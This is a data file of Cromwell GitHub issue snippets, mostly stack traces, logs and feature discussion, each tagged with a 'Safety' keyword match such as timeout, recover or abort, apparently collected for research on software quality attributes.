Safety,e$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:2271,unsafe,unsafeToFuture,2271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['unsafe'],['unsafeToFuture']
Safety,"e, @ruchim, @benjamincarlin, @gsaksena, @abaumann, @kshakir, @geoffjentry, and others at the Broad retreat and DSP holiday hackathon, we're putting a proposal for a new feature that reports task call resource utilization metrics to Stackdriver Monitoring API. This serves 2 important goals:. 1) Users can easily plot real-time resource usage statistics across all tasks in a workflow, or for a single task call across many workflow runs, etc. This can be very powerful to quickly determine outlier tasks that could use optimization, without the need for any configuration or code (or any changes to the workflow). It's also much easier than the current state-of-the-art, i.e. parsing task-level monitoring logs. 2) Scripts can easily get aggregate statistics on resource utilization and could produce suggestions based on those. This could provide a path towards automatic runtime configuration based on the models trained with historical data. One could also detect situations like out-of-memory calls and automatically adjust resources according to those. It would also be pretty easy to add logic for estimation of task call-level cost based on the pricing of associated resources. This could provide a long-sought feature of real-time cost monitoring/control (thanks to @TimothyTickle for the suggestion). Monitoring is done using the new ""monitoring action"" for PAPIv2, which currently uses the hard-coded [quay.io/broadinstitute/cromwell-monitor](https://quay.io/repository/broadinstitute/cromwell-monitor) image, built from https://github.com/broadinstitute/cromwell-monitor (I wasn't sure if that code belonged here or in a separate repo). This is advantageous to just using it as a _monitoring_script_, because it removes all assumptions on the ""user"" Docker image (for the task itself). For example, we don't have to assume a particular distribution or presence of Python and its libraries. So it should work exactly the same for any task. Per @geoffjentry's suggestion, we've [consulted](ht",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510:1000,detect,detect,1000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510,1,['detect'],['detect']
Safety,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1394,Timeout,TimeoutException,1394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['Timeout'],['TimeoutException']
Safety,"e/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata().Project(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```. This is a gsutil stacktrace. JES tried to copy the logs and failed, hence failing the ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846:2616,timeout,timeout,2616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846,1,['timeout'],['timeout']
Safety,ed unexpectedly.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1798,recover,recoverWith,1798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['recover'],['recoverWith']
Safety,"edSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; jav",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4923,Unsafe,Unsafe,4923,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"eg something like:; ```; $ cromwell quickstart; ## BACKEND ##; Would you like to run tasks [local], [sge] or [papi] (Google cloud)?; > [local] | papi; Installing gcloud......; Done! Would you like me to run [gcloud auth] for you to get default credentials set up?; > [yes] |; Running gcloud auth.......; Done!; Backend setup complete!. ## DATABASE ##; Would you like to keep a database of past runs (eg so that you can call-cache?); > [yes] | ; Would you like to use [mysql] or [hsqldb] file?; > [mysql] | ; MySQL detected. Will not reinstall.; Please enter a MySQL username:; > [root] | chris; Please enter the MySQL password:; > [] |; Database setup complete!. ## SETTING UP YOUR SYSTEM ##; Writing start/stop script to /usr/local/bin/cromwell.server...; Writing configuration file to /etc/cromwell/cromwell.conf... To run Cromwell you can now run:; # cromwell.server start; # cromwell submit <wdl> -i <inputs.json>. Good luck!; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2624:514,detect,detected,514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2624,1,['detect'],['detected']
Safety,"ement$(JdbcBackend.scala:367); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedStatement(JdbcBackend.scala:434); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:502); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:527); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.dbio.DBIOAction$$anon$4.$anonfun$run$3(DBIOAction.scala:240); 	at slick.dbio.DBIOAction$$anon$4$$Lambda$1952/113291290.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); [2018-03-09 15:56:36,88] [warn] Localhost hostname lookup failed, keeping the value 'unavailable'; java.util.concurrent.TimeoutException: null; 	at java.util.concurrent.FutureTask.get(FutureTask.java:205); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.updateCache(EventBuilder.java:491); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.getHostname(EventBuilder.java:477); 	at com.getsentry.raven.event.EventBuilder.autoSetMissingValues(EventBuilder.java:97); 	at com.getsentry.raven.event.EventBuilder.build(EventBuilder.java:410); 	at com.getsentry.raven.logback.SentryAppender.buildEvent(SentryAppender.java:324); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:230); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:37); 	at ch.qos.logback.core.AppenderBase.doAppend(AppenderBase.java:82); 	at ch.qos.logback.core.spi.AppenderAttachableImpl.appendLoopOnAppenders(AppenderAttachableImpl.java:51); 	at ch.qos.logback.classic.Logger.appendLoopOnAppenders(Logger.java:270); 	at ch.qos.logback.classic.Logger.callAppenders(Logger.java:257); 	at ch.qos.logback.classic.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:17898,Timeout,TimeoutException,17898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['Timeout'],['TimeoutException']
Safety,emented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1497,recover,recoverAsync,1497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,2,['recover'],['recoverAsync']
Safety,empting to Recover(StandardAsyncJob(4704e5c9-3a79-4280-a464-d737f36056ec)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1342,recover,recoverAsync,1342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recoverAsync']
Safety,"entral1-b"" on a ""custom-1-2048"" machine; timestamp: '2021-08-03T15:22:07.789742627Z'; workerAssigned:; instance: google-pipelines-worker-xxxxxx; machineType: custom-1-2048; zone: us-central1-b; labels:; cromwell-workflow-id: cromwell-xxxxxx; wdl-task-name: hello; pipeline:; actions:; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ container\ setup.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: ContainerSetup; timeout: 300s; - commands:; - -c; - mkdir -p /cromwell_root && chmod -R a+rwx /cromwell_root; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: ContainerSetup; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ container\ setup.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: ContainerSetup; timeout: 300s; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Background; runInBackground: true; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; outputName: stderr; tag: Background; mounts:; - disk: local-disk; path: /cromwell_root; runInBackground: true; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; outputName: stdout; tag: Background; mounts:; - disk: local-disk; path: /cromwell_root; runInBackground: true;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:16375,timeout,timeout,16375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:19,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:20,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:21,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:22,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:23,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:24,84] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:7697,abort,abort,7697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9798,abort,abort,9798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at 